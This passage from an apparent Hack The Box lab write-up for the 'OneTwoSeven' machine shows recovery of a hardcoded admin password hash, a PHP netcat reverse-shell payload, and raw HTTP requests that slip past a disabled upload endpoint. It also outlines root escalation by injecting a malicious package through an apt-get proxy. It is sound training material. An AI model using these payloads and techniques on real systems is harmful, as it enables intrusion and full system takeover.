<span class="string">''</span>;</span><br><span class="line">          <span class="meta">&lt;?php</span></span><br><span class="line">        &lt;h2 class="featurette-heading"&gt;Login to the kingdom.&lt;span class="text-muted"&gt; Up up and away!&lt;/span&gt;&lt;/h2&gt;</span><br><span class="line">      &lt;div class="col-md-12"&gt;</span><br><span class="line">    &lt;div class="row featurette"&gt;</span><br><span class="line">    &lt;!-- START THE FEATURETTES --&gt;</span><br><span class="line">  &lt;div class="container marketing"&gt;</span><br><span class="line">  &lt;!-- Wrap the rest of the page in another container to center all the content. --&gt;</span><br><span class="line">  ================================================== --&gt;</span><br><span class="line">  &lt;!-- Marketing messaging <span class="keyword">and</span> featurettes</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">    &lt;/a&gt;</span><br><span class="line">      &lt;span class="sr-only"&gt;Next&lt;/span&gt;</span><br><span class="line">      &lt;span class="carousel-control-next-icon" aria-hidden="true"&gt;&lt;/span&gt;</span><br><span class="line">    &lt;a class="carousel-control-next" href="#myCarousel" role="button" data-slide="next"&gt;</span><br><span class="line">    &lt;/a&gt;</span><br><span class="line">      &lt;span class="sr-only"&gt;Previous&lt;/span&gt;</span><br><span class="line">      &lt;span class="carousel-control-prev-icon" aria-hidden="true"&gt;&lt;/span&gt;</span><br><span class="line">    &lt;a class="carousel-control-prev" href="#myCarousel" role="button" data-slide="prev"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">            &lt;p&gt;Administration backend. <span class="keyword">For</span> administrators only.&lt;/p&gt;</span><br><span class="line">            &lt;h1&gt;OneTwoSeven Administration&lt;/h1&gt;</span><br><span class="line">          &lt;div class="carousel-caption text-left"&gt;</span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">        &lt;img src=<span class="string">"dist/img/ai-codes-coding-97077.jpg"</span>&gt;</span><br><span class="line">      &lt;div class="carousel-item active"&gt;</span><br><span class="line">    &lt;div class="carousel-inner"&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">      &lt;li data-target="#myCarousel" data-slide-to="0" class="active"&gt;&lt;/li&gt;</span><br><span class="line">    &lt;ol class="carousel-indicators"&gt;</span><br><span class="line">  &lt;div id="myCarousel" class="carousel slide" data-ride="carousel"&gt;</span><br><span class="line">&lt;main role=<span class="string">"main"</span>&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">  &lt;/nav&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="collapse navbar-collapse" id="navbarCollapse"&gt;</span><br><span class="line">    &lt;/button&gt;</span><br><span class="line">      &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;</span><br><span class="line">    &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation"&gt;</span><br><span class="line">    &lt;a class="navbar-brand" href="/login.php"&gt;OneTwoSeven - Administration Backend&lt;/a&gt;</span><br><span class="line">  &lt;nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark"&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">    &lt;link href=<span class="string">"carousel.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;!-- Custom styles <span class="keyword">for</span> this template --&gt;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">      @media (min-width: <span class="number">768</span>px) &#123; .bd-placeholder-img-lg &#123; font-size: <span class="number">3.5</span>rem; &#125; &#125;</span><br><span class="line">      .bd-placeholder-img &#123; font-size: <span class="number">1.125</span>rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; &#125;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    &lt;link href=<span class="string">"/dist/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span> crossorigin=<span class="string">"anonymous"</span>&gt;</span><br><span class="line">    &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">    &lt;title&gt;OneTwoSeven&lt;/title&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"generator"</span> content=<span class="string">"Jekyll v3.8.5"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"author"</span> content=<span class="string">"Mark Otto, Jacob Thornton, and Bootstrap contributors"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"description"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="keyword">if</span> (<span class="keyword">isset</span> ($_SESSION[<span class="string">'username'</span>])) &#123; header(<span class="string">"Location: /menu.php"</span>); &#125; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ( $_SERVER[<span class="string">'SERVER_PORT'</span>] != <span class="number">60080</span> ) &#123; <span class="keyword">die</span>(); &#125; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br><span class="line">      &lt;script&gt;window.jQuery || document.write(<span class="string">'&lt;script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"&gt;&lt;\/script&gt;'</span>)&lt;/script&gt;&lt;script src=<span class="string">"dist/js/bootstrap.bundle.min.js"</span> crossorigin=<span class="string">"anonymous"</span>&gt;&lt;/script&gt;&lt;/body&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://code.jquery.com/jquery-3.3.1.slim.min.js"</span> integrity=<span class="string">"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"</span> crossorigin=<span class="string">"anonymous"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/main&gt;</span><br><span class="line">  &lt;/footer&gt;</span><br><span class="line">    &lt;p&gt;&amp;copy; <span class="number">2019</span> OneTwoSeven, Dec. &amp;middot; &lt;a href=<span class="string">"#"</span>&gt;Privacy&lt;/a&gt; &amp;middot; &lt;a href=<span class="string">"#"</span>&gt;Terms&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p class="float-right"&gt;&lt;a href="#"&gt;Back to top&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">  &lt;footer class="container"&gt;</span><br><span class="line">  &lt;!-- FOOTER --&gt;</span><br><span class="line">  &lt;/div&gt;&lt;!-- /.container --&gt;</span><br><span class="line">    &lt;!-- /END THE FEATURETTES --&gt;</span><br><span class="line">    &lt;hr class="featurette-divider"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">	     &lt;/div&gt;</span><br><span class="line">         &lt;/form&gt;</span><br><span class="line">            &lt;/table&gt;</span><br><span class="line">              &lt;tr&gt;&lt;td colspan=<span class="string">"2"</span>&gt;&lt;center&gt;&lt;button type=<span class="string">"submit"</span> name=<span class="string">"login"</span>&gt;Login&lt;/button&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">              &lt;tr&gt;&lt;td&gt;&lt;b&gt;Password:&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span> size=<span class="string">"40"</span> required&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">              &lt;tr&gt;&lt;td&gt;&lt;b&gt;Username:&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> size=<span class="string">"40"</span> required autofocus&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">	    &lt;table&gt;</span><br><span class="line">            &lt;h4 class = "form-signin-heading"&gt;&lt;font size="-1" color="red"&gt;&lt;?php echo $msg; ?&gt;&lt;/font&gt;&lt;/h4&gt;</span><br><span class="line">         &lt;form action=<span class="string">"/login.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">      </span><br><span class="line">      &lt;div class = "container"&gt;</span><br><span class="line">      </span><br><span class="line">      &lt;/div&gt; &lt;!-- /container --&gt;</span><br><span class="line">         <span class="meta">?&gt;</span></span><br><span class="line">            &#125;</span><br><span class="line">              &#125;</span><br><span class="line">                  $msg = <span class="string">'Wrong username or password.'</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		  header(<span class="string">"Location: /menu.php"</span>);</span><br><span class="line">                  $_SESSION[<span class="string">'username'</span>] = <span class="string">'ots-admin'</span>;</span><br></pre></td></tr></table></figure>
<p>The credentials are hardcoded, however the password is hashed :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'username'</span>] == <span class="string">'ots-admin'</span> &amp;&amp; hash(<span class="string">'sha256'</span>,$_POST[<span class="string">'password'</span>]) == <span class="string">'11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8'</span>) &#123;</span><br></pre></td></tr></table></figure>
<p><a href="https://crackstation.net/" target="_blank" rel="noopener">Crackstation</a> was able to crack it :<br><img src="/images/hackthebox/onetwoseven/17.png" alt=""><br><code>ots-admin : Homesweethome1</code> :<br><img src="/images/hackthebox/onetwoseven/18.png" alt=""><br><img src="/images/hackthebox/onetwoseven/19.png" alt=""><br>There’s a plugin upload form and some installed plugins above it, additionally there’s a small button to download the module’s <code>php</code> source from the directory <code>/addons</code>:<br><img src="/images/hackthebox/onetwoseven/20.png" alt=""><br>If we can upload plugins then we got <code>RCE</code>, the form submit button is disabled but we can easily change that :<br><img src="/images/hackthebox/onetwoseven/21.png" alt=""><br><img src="/images/hackthebox/onetwoseven/22.png" alt=""><br><img src="/images/hackthebox/onetwoseven/23.png" alt=""><br><img src="/images/hackthebox/onetwoseven/24.png" alt=""><br><code>rev.php</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/onetwoseven/25.png" alt=""><br><img src="/images/hackthebox/onetwoseven/26.png" alt=""><br>It sent the request to <code>addon-upload.php</code> and the response was 404.</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/addon-upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:60080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------171386507112993851681929761040</span><br><span class="line"><span class="attribute">Content-Length</span>: 326</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------171386507112993851681929761040</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="addon"; filename="rev.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------171386507112993851681929761040--</span><br></pre></td></tr></table></figure>
<p> If we check the <code>Addon manager</code> plugin we can see some interesting things :<br><img src="/images/hackthebox/onetwoseven/27.png" alt=""><br>First thing is the rewrite rules, any request sent to <code>addon-upload.php</code> and <code>addon-download.php</code> gets sent to <code>addons/ots-man-addon.php</code>. There’s also a small note that says “Disabling a feature through htaccess leads to 404 errors for now.”, This explains why we got 404 when attempting to upload a plugin, however the download feature isn’t disabled and I was able to download the <code>Addon manager</code> plugin :<br><img src="/images/hackthebox/onetwoseven/28.png" alt=""><br>Since both requests to <code>addon-upload.php</code> and <code>addon-download.php</code> go to <code>ots-man-addon.php</code>, we have to find a way to exploit <code>ots-man-addon.php</code> and just use <code>addon-download.php</code> because it’s not disabled.<br><code>ots-man-addon.php</code> : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'username'</span>])) &#123; header(<span class="string">"Location: /login.php"</span>); &#125;; <span class="keyword">if</span> ( strpos($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'/addons/'</span>) !== <span class="keyword">false</span> ) &#123; <span class="keyword">die</span>(); &#125;;</span><br><span class="line"><span class="comment"># OneTwoSeven Admin Plugin</span></span><br><span class="line"><span class="comment"># OTS Addon Manager</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">	<span class="comment"># Upload addon to addons folder.</span></span><br><span class="line">	<span class="keyword">case</span> preg_match(<span class="string">'/\/addon-upload.php/'</span>,$_SERVER[<span class="string">'REQUEST_URI'</span>]):</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'addon'</span>]))&#123;</span><br><span class="line">			$errors= <span class="keyword">array</span>();</span><br><span class="line">			$file_name = basename($_FILES[<span class="string">'addon'</span>][<span class="string">'name'</span>]);</span><br><span class="line">			$file_size =$_FILES[<span class="string">'addon'</span>][<span class="string">'size'</span>];</span><br><span class="line">			$file_tmp =$_FILES[<span class="string">'addon'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>($file_size &gt; <span class="number">20000</span>)&#123;</span><br><span class="line">				$errors[]=<span class="string">'Module too big for addon manager. Please upload manually.'</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">empty</span>($errors)==<span class="keyword">true</span>) &#123;</span><br><span class="line">				move_uploaded_file($file_tmp,$file_name);</span><br><span class="line">				header(<span class="string">"Location: /menu.php"</span>);</span><br><span class="line">				header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"File uploaded successfull.y"</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				header(<span class="string">"Location: /menu.php"</span>);</span><br><span class="line">				header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"Error uploading the file: "</span>;</span><br><span class="line">				print_r($errors);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="comment"># Download addon from addons folder.</span></span><br><span class="line">	<span class="keyword">case</span> preg_match(<span class="string">'/\/addon-download.php/'</span>,$_SERVER[<span class="string">'REQUEST_URI'</span>]):</span><br><span class="line">		<span class="keyword">if</span> ($_GET[<span class="string">'addon'</span>]) &#123;</span><br><span class="line">			$addon_file = basename($_GET[<span class="string">'addon'</span>]);</span><br><span class="line">			<span class="keyword">if</span> ( file_exists($addon_file) ) &#123;</span><br><span class="line">				header(<span class="string">"Content-Disposition: attachment; filename=$addon_file"</span>);</span><br><span class="line">				header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line">				readfile($addon_file);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				header($_SERVER[<span class="string">"SERVER_PROTOCOL"</span>].<span class="string">" 404 Not Found"</span>, <span class="keyword">true</span>, <span class="number">404</span>);</span><br><span class="line">				<span class="keyword">die</span>();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"The addon manager must not be executed directly but only via"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"the provided RewriteRules:"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"RewriteEngine On"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"RewriteRule ^addon-download.php addons/ots-man-addon.php [L]"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"By commenting individual RewriteRules you can disable single"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"features (i.e. for security reasons)"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;font size='-2'&gt;Please note: Disabling a feature through htaccess leads to 404 errors for now.&lt;/font&gt;"</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>This part of the code tells us what we need to do :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> preg_match(<span class="string">'/\/addon-upload.php/'</span>,$_SERVER[<span class="string">'REQUEST_URI'</span>]):</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'addon'</span>]))&#123;</span><br><span class="line">		$errors= <span class="keyword">array</span>();</span><br><span class="line">		$file_name = basename($_FILES[<span class="string">'addon'</span>][<span class="string">'name'</span>]);</span><br><span class="line">		$file_size =$_FILES[<span class="string">'addon'</span>][<span class="string">'size'</span>];</span><br><span class="line">		$file_tmp =$_FILES[<span class="string">'addon'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($file_size &gt; <span class="number">20000</span>)&#123;</span><br><span class="line">			$errors[]=<span class="string">'Module too big for addon manager. Please upload manually.'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($errors)==<span class="keyword">true</span>) &#123;</span><br><span class="line">			move_uploaded_file($file_tmp,$file_name);</span><br><span class="line">			header(<span class="string">"Location: /menu.php"</span>);</span><br><span class="line">			header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File uploaded successfull.y"</span>;</span><br></pre></td></tr></table></figure>
<p>We need to have <code>/addon-upload.php</code> in the request URI, we can’t request <code>/addon-upload.php</code> directly because it’s disabled but we can just put a useless <code>GET</code> parameter with the value <code>/addon-upload.php</code>,  and it will pass the check.<br>It takes the addon name from the <code>GET</code> parameter <code>addon</code> so we have to add that parameter to the request URI.<br>So the request URI looks like this : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;addon-download.php?addon&#x3D;addons&#x2F;rev.php&amp;test&#x3D;&#x2F;addon-upload.php</span><br></pre></td></tr></table></figure>
<p>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/addon-download.php?addon=addons/rev.php&amp;test=/addon-upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:60080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------171386507112993851681929761040</span><br><span class="line"><span class="attribute">Content-Length</span>: 326</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------171386507112993851681929761040</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="addon"; filename="rev.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------171386507112993851681929761040--</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Date</span>: Thu, 29 Aug 2019 20:56:24 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Location</span>: /menu.php</span><br><span class="line"><span class="attribute">Content-Length</span>: 27</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain;charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">File uploaded successfull.y</span><br></pre></td></tr></table></figure>
<p>Now if we check <code>/addons</code>, <code>rev.php</code> is there :<br><img src="/images/hackthebox/onetwoseven/29.png" alt=""><br><img src="/images/hackthebox/onetwoseven/30.png" alt=""></p>
<h2 id="APT-MITM-Root-Flag"><a href="#APT-MITM-Root-Flag" class="headerlink" title="APT MITM, Root Flag"></a>APT MITM, Root Flag</h2><p>As <code>www-admin-data</code>  we can run <code>apt-get update</code> and <code>apt-get upgrade</code> as root without a password :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-admin-data@onetwoseven:&#x2F;$ sudo -l</span><br><span class="line">Matching Defaults entries for www-admin-data on onetwoseven:</span><br><span class="line">    env_reset, env_keep+&#x3D;&quot;ftp_proxy http_proxy https_proxy no_proxy&quot;,</span><br><span class="line">    mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User www-admin-data may run the following commands on onetwoseven:</span><br><span class="line">    (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;apt-get update, &#x2F;usr&#x2F;bin&#x2F;apt-get upgrade</span><br></pre></td></tr></table></figure>
<p>Also when using <code>sudo</code> it doesn’t reset these environment variables : <code>ftp_proxy</code>, <code>http_proxy</code>, <code>https_proxy</code><br>We can create a fake apt repository and add a malicious package that gives us code execution. Then we can run a proxy server (burp or anything else) and set the <code>http_proxy</code> variable to our server. After that we can make the proxy server use our fake repository instead of the real one by adding an entry in <code>/etc/hosts</code>. Finally when we run <code>apt-get update &amp;&amp; apt-get upgrade</code> it will attempt to install our malicious package that will give us a root shell. This <a href="https://versprite.com/blog/apt-mitm-package-injection/" target="_blank" rel="noopener">article</a> was very helpful.<br>Let’s check the sources that box is using first :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www-admin-data@onetwoseven:&#x2F;$ cat &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line"># deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]&#x2F; ascii main non-free</span><br><span class="line"></span><br><span class="line">#deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]&#x2F; ascii main non-free</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;de.deb.devuan.org&#x2F;merged ascii main</span><br><span class="line"># deb-src http:&#x2F;&#x2F;de.deb.devuan.org&#x2F;merged ascii main</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;de.deb.devuan.org&#x2F;merged ascii-security main</span><br><span class="line"># deb-src http:&#x2F;&#x2F;de.deb.devuan.org&#x2F;merged ascii-security main</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;de.deb.devuan.org&#x2F;merged ascii-updates main</span><br><span class="line"># deb-src http:&#x2F;&#x2F;de.deb.devuan.org&#x2F;merged ascii-updates main</span><br><span class="line">www-admin-data@onetwoseven:&#x2F;$ cat &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;onetwoseven.list </span><br><span class="line"># OneTwoSeven special packages - not yet in use</span><br><span 